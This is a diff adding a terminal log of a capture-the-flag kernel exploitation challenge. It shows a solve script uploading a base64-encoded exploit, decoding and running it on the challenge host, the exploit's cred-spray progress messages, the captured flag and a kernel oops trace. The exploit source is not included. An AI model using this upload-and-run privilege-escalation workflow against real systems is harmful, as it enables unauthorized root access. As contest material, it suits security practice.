@@ -1,0 +1,120 @@
+mito@mito-virtual-machine:~/CTF/0xFUN_CTF_2026/Pwn_Phantom$ python3 solve.py
+[+] Opening connection to chall.0xfun.org on port 38687: Done
+Uploading...
+0 / 58776
+1000 / 58776
+2000 / 58776
+3000 / 58776
+4000 / 58776
+5000 / 58776
+6000 / 58776
+7000 / 58776
+8000 / 58776
+9000 / 58776
+10000 / 58776
+11000 / 58776
+12000 / 58776
+13000 / 58776
+14000 / 58776
+15000 / 58776
+16000 / 58776
+17000 / 58776
+18000 / 58776
+19000 / 58776
+20000 / 58776
+21000 / 58776
+22000 / 58776
+23000 / 58776
+24000 / 58776
+25000 / 58776
+26000 / 58776
+27000 / 58776
+28000 / 58776
+29000 / 58776
+30000 / 58776
+31000 / 58776
+32000 / 58776
+33000 / 58776
+34000 / 58776
+35000 / 58776
+36000 / 58776
+37000 / 58776
+38000 / 58776
+39000 / 58776
+40000 / 58776
+41000 / 58776
+42000 / 58776
+43000 / 58776
+44000 / 58776
+45000 / 58776
+46000 / 58776
+47000 / 58776
+48000 / 58776
+49000 / 58776
+50000 / 58776
+51000 / 58776
+52000 / 58776
+53000 / 58776
+54000 / 58776
+55000 / 58776
+56000 / 58776
+57000 / 58776
+58000 / 58776
+[DEBUG] Sent 0x1e bytes:
+    b'cat exp_b64 | base64 -d > exp\n'
+[DEBUG] Sent 0xe bytes:
+    b'chmod 777 exp\n'
+[DEBUG] Sent 0x6 bytes:
+    b'./exp\n'
+[*] Switching to interactive mode
+[DEBUG] Received 0x3 bytes:
+    b'cat'
+cat[DEBUG] Received 0x23 bytes:
+    b' exp_b64 | base64 -d > exp\r\n'
+    b'/tmp $ '
+
+/tmp $ [DEBUG] Received 0x6a bytes:
+    b'chmod 777 exp\r\n'
+    b'/tmp $ ./exp\r\n'
+    b'[*] Open dev\r\n'
+    b'check page\r\n'
+    b'check buddy\r\n'
+    b'[*] Spray Cred\r\n'
+    b'[+] Recapturing cred\r\n'
+
+
+
+
+
+
+
+$ 
+[DEBUG] Sent 0x1 bytes:
+    b'\n'
+[DEBUG] Received 0x2 bytes:
+    b'\r\n'
+
+[DEBUG] Received 0x7 bytes:
+    b'/tmp $ '
+/tmp $ [DEBUG] Received 0x25 bytes:
+    b'0xfun{r34l_k3rn3l_h4ck3rs_d0nt_unzip}'
+0xfun{r34l_k3rn3l_h4ck3rs_d0nt_unzip}[DEBUG] Received 0x5b4 bytes:
+    b'\r\n'
+    b'[   27.207106] BUG: kernel NULL pointer dereference, address: 0000000000000004\r\n'
+    b'[   27.207561] #PF: supervisor read access in kernel mode\r\n'
+    b'[   27.207686] #PF: error_code(0x0000) - not-present page\r\n'
+    b'[   27.207838] PGD 489b067 P4D 489b067 PUD 489c067 PMD 0 \r\n'
+    b'[   27.208106] Oops: 0000 [#1] PREEMPT SMP NOPTI\r\n'
+    b'[   27.208306] CPU: 0 PID: 121 Comm: exp Not tainted 6.6.15 #1\r\n'
+    b'[   27.208438] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014\r\n'
+    b'[   27.208699] RIP: 0010:selinux_inode_alloc_security+0x35/0x70\r\n'
+    b'[   27.209072] Code: 74 0a 48 63 15 54 4c 36 01 48 01 d0 65 48 8b 14 25 80 ac 02 00 48 8b 8a 08 07 00 00 48 63 15 32 4c 36 01 48 8b 89 80 0'
+    b'[   27.209430] RSP: 0018:ffffc9000039fe40 EFLAGS: 00000286\r\n'
+    b'[   27.209550] RAX: ffff888004396828 RBX: ffffffff827c3a50 RCX: 0000000000000000\r\n'
+    b'[   27.209690] RDX: 0000000000000000 RSI: ffffffff81459c23 RDI: ffff888003cb8e40\r\n'
+    b'[   27.209820] RBP: ffff888003cb8e40 R08: 000000000002f170 R09: 0000000000000000\r\n'
+    b'[   27.209945] R10: ffff888004396818 R11: 0000000000000000 R12: ffff888003cb8fa8\r\n'
+    b'[   27.210077] R13: 0000000000080000 R14: ffffc9000039ff00 R15: 0000000000000000\r\n'
+    b'[   27.210227] FS:  0000000000408cd8(0000) GS:ffff88800f800000(0000) knlGS:0000000000000000\r\n'
+    b'[   27.210373] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\r\n'
+    b'[   27.210483] CR2: 0000000000000004 CR3: 00000000048a8000 CR4: 00000000003006f0\r'
